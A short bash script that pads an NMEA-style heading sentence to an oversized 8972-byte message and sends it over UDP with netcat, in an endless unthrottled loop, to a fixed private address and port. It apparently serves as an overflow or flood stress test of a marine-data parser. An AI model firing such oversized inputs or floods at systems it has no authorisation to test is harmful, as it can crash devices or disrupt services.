#!/bin/bash

MESSAGE_SIZE=8972
HEADER='$IIHDT,33,T*'
PADDING_SIZE=$((MESSAGE_SIZE - ${#HEADER}))
MESSAGE="${HEADER}$(printf 'A%.0s' $(seq 1 $PADDING_SIZE))"

DESTINATION_IP="10.42.0.60"
DESTINATION_PORT="8888"

while true; do
    echo -n "$MESSAGE" | nc -u -w1 "$DESTINATION_IP" "$DESTINATION_PORT"
    if [ $? -ne 0 ]; then
        echo "Failed to send message"
    fi
done
